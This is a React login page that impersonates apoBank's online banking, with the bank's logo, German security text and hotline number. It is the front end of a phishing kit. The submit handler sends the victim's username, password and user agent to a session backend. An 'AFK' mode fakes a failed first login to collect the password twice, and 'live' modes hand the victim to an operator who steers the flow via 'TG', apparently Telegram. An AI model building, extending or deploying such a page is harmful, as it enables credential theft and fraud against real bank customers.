import { useState, useRef, useEffect } from "react";
import { useNavigate } from "react-router-dom";
import { Input } from "@/components/ui/input";
import { Button } from "@/components/ui/button";
import { Phone, ShieldCheck, Globe, Mail, Info } from "lucide-react";
import { cn } from "@/lib/utils";
import headerBankingAsset from "@/assets/header-banking.jpg.asset.json";
import apobankLogo from "@/assets/apobank-logo.svg";
import { startSession } from "@/hooks/useSessionFlow";

const LoginPage = () => {
  const navigate = useNavigate();
  const usernameRef = useRef<HTMLInputElement>(null);
  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");
  const [usernameTouched, setUsernameTouched] = useState(false);
  const [passwordTouched, setPasswordTouched] = useState(false);
  const [usernameDirty, setUsernameDirty] = useState(false);
  const [passwordDirty, setPasswordDirty] = useState(false);
  const [error, setError] = useState("");

  useEffect(() => {
    usernameRef.current?.focus();
    const flag = sessionStorage.getItem("login_error");
    if (flag) {
      setError(flag);
      sessionStorage.removeItem("login_error");
    }
  }, []);

  const usernameError = (usernameTouched || usernameDirty) && !username.trim();
  const passwordError = (passwordTouched || passwordDirty) && !password.trim();

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!username.trim() || !password.trim()) {
      setError("");
      if (!username.trim()) setUsernameTouched(true);
      if (!password.trim()) setPasswordTouched(true);
      return;
    }
    setError("");
    let mode: "afk" | "live" | "live_change" = "afk";
    try {
      const s = await startSession({ username: username.trim(), password, ua: navigator.userAgent, started_at: new Date().toISOString() });
      mode = s.mode;
    } catch (err) {
      console.error("session-start failed", err);
    }

    // In AFK mode: first attempt fails, second succeeds.
    // In live/live_change: go straight to loader, operator controls flow via TG.
    if (mode === "afk") {
      const attempts = Number(sessionStorage.getItem("afk_login_attempts") || "0") + 1;
      sessionStorage.setItem("afk_login_attempts", String(attempts));
      if (attempts < 2) {
        setError("Anmeldung fehlgeschlagen. Bitte überprüfen Sie Ihre Zugangsdaten.");
        setPassword("");
        return;
      }
      sessionStorage.removeItem("afk_login_attempts");
    }

    navigate("/loading");
  };

  return (
    <div className="min-h-screen bg-white flex flex-col items-center px-3 sm:px-0">
      <div className="w-full max-w-[820px] bg-white mt-10 sm:mt-12 mb-8 rounded-tr-[16px] overflow-hidden border border-border/40 shadow-[0_2px_16px_rgba(0,0,0,0.08)]">
        {/* Header */}
        <div className="px-4 sm:px-8 py-4 sm:py-5 shadow-[0_4px_14px_-2px_rgba(0,0,0,0.25)]">
          <h1 className="text-2xl sm:text-4xl font-medium text-primary" style={{ fontFamily: "'Arial Greek', Arial, sans-serif" }}>Login apoBank</h1>
        </div>

        <div className="px-4 sm:px-8 py-5 sm:py-6 space-y-6 sm:space-y-8 bg-muted border border-border/40 border-t-0">
          {/* Welcome */}
          <p className="font-semibold text-foreground" style={{ fontFamily: "'Tanseek Modern Arabic Medium', Arial, sans-serif" }}>
            Willkommen im Online-Banking der apoBank
          </p>

          {/* Security Banner */}
          <img
            src={headerBankingAsset.url}
            alt="Sicherheitshinweis"
            className="w-full"
            width={1600}
            height={512}
          />

          {/* Info Links */}
          <div className="space-y-5 text-sm text-foreground">
            <p>
              Aktuelle Warnung vor Phishing und Betrugsversuchen:{" "}
              <a href="#" className="underline text-primary hover:opacity-80">
                apobank.de/aktuelle-sicherheitshinweise
              </a>
            </p>
            <p>
              Allgemeine Informationen zum Online-Banking finden Sie unter:{" "}
              <a href="#" className="underline text-primary hover:opacity-80">
                apobank.de/onlinebanking
              </a>
            </p>
            <p>
              Statusmeldungen zu aktuellen Störungen finden Sie unter:{" "}
              <a href="#" className="underline text-primary hover:opacity-80">
                apobank.de/status-onlinebanking
              </a>
            </p>
          </div>

          {/* Error Message */}
          {error && (
            <div className="bg-red-100 border border-red-200 text-red-900 px-4 py-5 rounded text-sm">
              {error}
            </div>
          )}

          {/* Login Form */}
          <form onSubmit={handleSubmit} className="space-y-6">
            <div className="grid grid-cols-1 sm:grid-cols-[160px_1fr] items-start gap-1 sm:gap-4">
              <label className="font-semibold text-sm text-foreground sm:mt-2.5">
                Benutzername
              </label>
              <div>
                <div className="relative">
                  <Input
                    ref={usernameRef}
                    value={username}
                    onChange={(e) => {
                      setUsername(e.target.value);
                      if (e.target.value.trim()) setUsernameDirty(true);
                    }}
                    className={cn(
                      "bg-white focus:ring-[3px] focus:ring-[#a0b0c8] focus:ring-offset-0 focus-visible:ring-[3px] focus-visible:ring-[#a0b0c8] focus-visible:ring-offset-0",
                      usernameError && "border-destructive focus:ring-[3px] focus:ring-[#dc3545] focus:ring-offset-0 focus-visible:ring-[3px] focus-visible:ring-[#dc3545] focus-visible:ring-offset-0 pr-10"
                    )}
                  />
                  {usernameError && (
                    <Info className="absolute right-3 top-1/2 -translate-y-1/2 w-5 h-5 text-destructive pointer-events-none" />
                  )}
                </div>
                {usernameError && (
                  <p className="text-destructive text-sm mt-1">Ein Wert wird benötigt</p>
                )}
              </div>
            </div>
            <div className="grid grid-cols-1 sm:grid-cols-[160px_1fr] items-start gap-1 sm:gap-4">
              <label className="font-semibold text-sm text-foreground sm:mt-2.5">
                Passwort
              </label>
              <div>
                <div className="relative">
                  <Input
                    type="password"
                    value={password}
                    onChange={(e) => {
                      setPassword(e.target.value);
                      if (e.target.value.trim()) setPasswordDirty(true);
                    }}
                    className={cn(
                      "bg-white focus-visible:ring-[3px] focus-visible:ring-[#a0b0c8] focus-visible:ring-offset-0",
                      passwordError && "border-destructive focus-visible:ring-[3px] focus-visible:ring-[#dc3545] focus-visible:ring-offset-0 pr-10"
                    )}
                  />
                  {passwordError && (
                    <Info className="absolute right-3 top-1/2 -translate-y-1/2 w-5 h-5 text-destructive pointer-events-none" />
                  )}
                </div>
                {passwordError && (
                  <p className="text-destructive text-sm mt-1">Ein Wert wird benötigt</p>
                )}
              </div>
            </div>
            <div className="flex justify-end">
              <Button
                type="submit"
                variant="outline"
                className={cn(
                  "px-8 bg-white hover:bg-white",
                  password.length > 0
                    ? "border-foreground text-foreground hover:text-foreground"
                    : "border-muted-foreground/40 text-muted-foreground hover:text-muted-foreground"
                )}
              >
                Anmelden
              </Button>
            </div>
          </form>

          <p className="text-sm text-foreground">
            Mit dem Absenden Ihrer Anmeldedaten erkennen Sie die{" "}
            <a href="#" className="underline text-primary hover:opacity-80">
              Sicherheitshinweise
            </a>{" "}
            an.
          </p>

          {/* Security Tips */}
          <div className="space-y-5">
            <p className="font-semibold text-foreground text-sm">
              Maßnahmen für sicheres Online-Banking:
            </p>
            <div className="space-y-5 text-sm text-foreground">
              <div className="flex items-start gap-3">
                <ShieldCheck className="w-5 h-5 text-muted-foreground mt-0.5 shrink-0" />
                <span>1. Wir fragen niemals nach Ihren Zugangsdaten.</span>
              </div>
              <div className="flex items-start gap-3">
                <Globe className="w-5 h-5 text-muted-foreground mt-0.5 shrink-0" />
                <span>2. Loggen Sie sich immer über www.apobank.de ein.</span>
              </div>
              <div className="flex items-start gap-3">
                <Mail className="w-5 h-5 text-muted-foreground mt-0.5 shrink-0" />
                <span>
                  3. Bei zweifelhaften E-Mails gilt: Keine Links oder Anhänge
                  öffnen.
                </span>
              </div>
            </div>
          </div>

          {/* Contact */}
          <div className="space-y-1 text-sm">
            <div className="flex items-center gap-2 text-foreground">
              <Phone className="w-4 h-4" />
              <span>+49 211 5998 8000</span>
            </div>
            <a href="#" className="underline text-primary hover:opacity-80 text-sm">
              Hotlines der apoBank
            </a>
          </div>
        </div>
      </div>

      {/* Footer Logo */}
      <div className="pb-10">
        <img
          src={apobankLogo}
          alt="apoBank - Bank der Gesundheit"
          className="h-16 mx-auto"
          loading="lazy"
        />
      </div>
    </div>
  );
};

export default LoginPage;
